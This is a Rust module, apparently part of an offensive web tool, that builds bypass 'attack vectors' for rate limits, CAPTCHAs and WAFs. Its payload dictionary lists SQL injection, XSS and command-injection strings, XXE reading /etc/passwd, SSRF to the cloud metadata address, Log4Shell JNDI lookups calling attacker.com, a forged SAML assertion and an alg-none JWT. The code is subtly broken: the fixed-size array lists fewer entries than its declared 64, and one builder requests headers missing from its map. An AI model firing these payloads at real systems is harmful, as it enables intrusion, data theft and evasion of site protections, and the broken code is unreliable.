//! Payload Generation Module for Automation Bypasses
//!
//! Generates bounded header mutation dictionaries for WAF and rate-limit evasion.
//! Implements context-aware payload templates with strict memory constraints.

use std::collections::HashMap;

/// Maximum payload dictionary size (bounded)
const MAX_PAYLOAD_COUNT: usize = 64;

/// Maximum header mutations per category (bounded)
const MAX_HEADER_MUTATIONS: usize = 32;

/// Bounded payload dictionary
#[derive(Debug, Clone)]
pub struct PayloadDictionary {
    payloads: [&'static str; MAX_PAYLOAD_COUNT],
    count: usize,
}

impl PayloadDictionary {
    pub fn new() -> Self {
        Self {
            payloads: [
                // Rate limit bypass headers
                "X-Forwarded-For: 127.0.0.1",
                "X-Real-IP: 127.0.0.1",
                "X-Client-IP: 10.0.0.1",
                "True-Client-IP: 192.168.1.1",
                "CF-Connecting-IP: 8.8.8.8",
                // CAPTCHA bypass values
                "captcha=",
                "g-recaptcha-response=",
                "h-captcha-response=",
                "cf_turnstile_response=",
                // Common weak values
                "null",
                "undefined",
                "0",
                "false",
                // Path traversal lite
                "../",
                "..\\",
                "%2e%2e%2f",
                "%252e%252e%252f",
                // SQL injection lite
                "' OR '1'='1",
                "1; DROP TABLE--",
                "' UNION SELECT NULL--",
                // XSS lite
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)",
                // Command injection lite
                "; id",
                "| whoami",
                "`id`",
                "$(id)",
                // SSTI payloads
                "${7*7}",
                "{{7*7}}",
                "#{7*7}",
                "<%= 7*7 %>",
                // XXE lite
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
                // SAML forgery
                "<saml:Assertion>forged</saml:Assertion>",
                // JWT manipulation
                "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0",
                // Header pollution
                "X-Custom: value1\\r\\nX-Injected: value2",
                // Cookie manipulation
                "session=admin; Path=/",
                // Content-Type abuse
                "Content-Type: application/x-www-form-urlencoded",
                "Content-Type: multipart/form-data",
                "Content-Type: application/json",
                "Content-Type: text/xml",
                // Encoding variations
                "%3Cscript%3E",
                "\\u003cscript\\u003e",
                "&#60;script&#62;",
                // HTTP method override
                "X-HTTP-Method-Override: DELETE",
                "X-Method-Override: PUT",
                // Protocol downgrade
                "Upgrade: h2c",
                // Cache poisoning
                "X-Cache: HIT",
                "Age: 999999",
                // CORS abuse
                "Origin: https://evil.com",
                // SSRF internal
                "http://localhost:8080",
                "http://169.254.169.254/",
                // Log4Shell JNDI
                "${jndi:ldap://attacker.com/a}",
                "${jndi:rmi://attacker.com/exploit}",
                // Path variations
                "/api/../admin",
                "/static/../../etc/passwd",
                // Parameter pollution
                "id=1&id=2&id=3",
                "param=value&param=other",
            ],
            count: MAX_PAYLOAD_COUNT,
        }
    }

    pub fn iter(&self) -> impl Iterator<Item = &&str> {
        self.payloads[..self.count].iter()
    }

    pub fn get(&self, index: usize) -> Option<&str> {
        if index < self.count {
            Some(self.payloads[index])
        } else {
            None
        }
    }

    pub fn len(&self) -> usize {
        self.count
    }
}

impl Default for PayloadDictionary {
    fn default() -> Self {
        Self::new()
    }
}

/// Header mutation generator
#[derive(Debug, Clone)]
pub struct HeaderMutationGenerator {
    mutations: HashMap<&'static str, Vec<&'static str>>,
}

impl HeaderMutationGenerator {
    pub fn new() -> Self {
        let mut mutations = HashMap::new();

        // X-Forwarded-For variations
        mutations.insert("X-Forwarded-For", vec![
            "127.0.0.1",
            "10.0.0.1",
            "192.168.1.1",
            "172.16.0.1",
            "8.8.8.8",
            "1.1.1.1",
            "0.0.0.0",
            "255.255.255.255",
        ]);

        // Content-Type mutations
        mutations.insert("Content-Type", vec![
            "application/json",
            "application/x-www-form-urlencoded",
            "multipart/form-data",
            "text/xml",
            "application/xml",
            "text/plain",
            "application/octet-stream",
        ]);

        // Accept variations
        mutations.insert("Accept", vec![
            "*/*",
            "application/json",
            "text/html",
            "application/xml",
        ]);

        // User-Agent rotations
        mutations.insert("User-Agent", vec![
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (Linux; Android 10)",
            "curl/7.68.0",
            "python-requests/2.28.0",
            "Googlebot/2.1",
            "Bingbot/2.0",
        ]);

        // Authorization formats
        mutations.insert("Authorization", vec![
            "Bearer token",
            "Basic dGVzdDp0ZXN0",
            "ApiKey test",
            "JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",
        ]);

        // Cookie mutations
        mutations.insert("Cookie", vec![
            "session=abc123",
            "PHPSESSID=abc123",
            "JSESSIONID=abc123",
            "ASP.NET_SessionId=abc123",
        ]);

        Self { mutations }
    }

    pub fn get_mutations(&self, header: &str) -> Vec<&str> {
        self.mutations.get(header)
            .map(|v| v.iter().cloned().collect())
            .unwrap_or_default()
    }

    pub fn all_headers(&self) -> Vec<&str> {
        self.mutations.keys().cloned().collect()
    }
}

impl Default for HeaderMutationGenerator {
    fn default() -> Self {
        Self::new()
    }
}

/// Context-aware payload builder
pub struct ContextPayloadBuilder {
    dict: PayloadDictionary,
    header_gen: HeaderMutationGenerator,
}

impl ContextPayloadBuilder {
    pub fn new() -> Self {
        Self {
            dict: PayloadDictionary::new(),
            header_gen: HeaderMutationGenerator::new(),
        }
    }

    /// Generate payloads for rate limit testing
    pub fn rate_limit_payloads(&self) -> Vec<&str> {
        self.dict.iter()
            .filter(|p| p.contains("Forwarded") || p.contains("Client-IP") || p.contains("Real-IP"))
            .cloned()
            .collect()
    }

    /// Generate payloads for CAPTCHA testing
    pub fn captcha_payloads(&self) -> Vec<&str> {
        self.dict.iter()
            .filter(|p| p.contains("captcha") || p.contains("recaptcha"))
            .cloned()
            .collect()
    }

    /// Generate payloads for WAF evasion
    pub fn waf_evasion_payloads(&self) -> Vec<&str> {
        self.dict.iter()
            .filter(|p| {
                p.contains("%") || p.contains("\\u") || p.contains("&#") ||
                p.contains("<script") || p.contains("DROP")
            })
            .cloned()
            .collect()
    }

    /// Generate header mutations for a specific header
    pub fn mutate_header(&self, header: &str) -> Vec<(&str, &str)> {
        self.header_gen.get_mutations(header)
            .into_iter()
            .map(|v| (header, v))
            .collect()
    }

    /// Build combined attack vector
    pub fn build_attack_vector(&self, attack_type: &str) -> Vec<(String, String)> {
        let mut vector = Vec::new();

        match attack_type {
            "rate_bypass" => {
                for header in ["X-Forwarded-For", "X-Real-IP", "True-Client-IP"] {
                    for value in self.header_gen.get_mutations(header) {
                        vector.push((header.to_string(), value.to_string()));
                    }
                }
            }
            "captcha_bypass" => {
                for payload in self.captcha_payloads() {
                    if let Some(eq_pos) = payload.find('=') {
                        let key = &payload[..eq_pos];
                        let value = &payload[eq_pos + 1..];
                        vector.push((key.to_string(), value.to_string()));
                    }
                }
            }
            "waf_bypass" => {
                for payload in self.waf_evasion_payloads() {
                    vector.push(("X-Custom-Payload".to_string(), payload.to_string()));
                }
            }
            _ => {}
        }

        vector
    }
}

impl Default for ContextPayloadBuilder {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_payload_dictionary_bounds() {
        let dict = PayloadDictionary::new();
        assert_eq!(dict.len(), MAX_PAYLOAD_COUNT);
        
        let all_payloads: Vec<_> = dict.iter().collect();
        assert_eq!(all_payloads.len(), MAX_PAYLOAD_COUNT);
    }

    #[test]
    fn test_header_mutations() {
        let gen = HeaderMutationGenerator::new();
        
        let xff_mutations = gen.get_mutations("X-Forwarded-For");
        assert!(!xff_mutations.is_empty());
        
        let all_headers = gen.all_headers();
        assert!(all_headers.contains(&"X-Forwarded-For"));
    }

    #[test]
    fn test_context_builder() {
        let builder = ContextPayloadBuilder::new();
        
        let rate_payloads = builder.rate_limit_payloads();
        assert!(!rate_payloads.is_empty());
        
        let captcha_payloads = builder.captcha_payloads();
        assert!(!captcha_payloads.is_empty());
        
        let attack_vector = builder.build_attack_vector("rate_bypass");
        assert!(!attack_vector.is_empty());
    }

    #[test]
    fn test_bounded_memory() {
        let dict = PayloadDictionary::new();
        // Verify reasonable stack size
        assert!(std::mem::size_of::<PayloadDictionary>() <= 1024);
    }
}
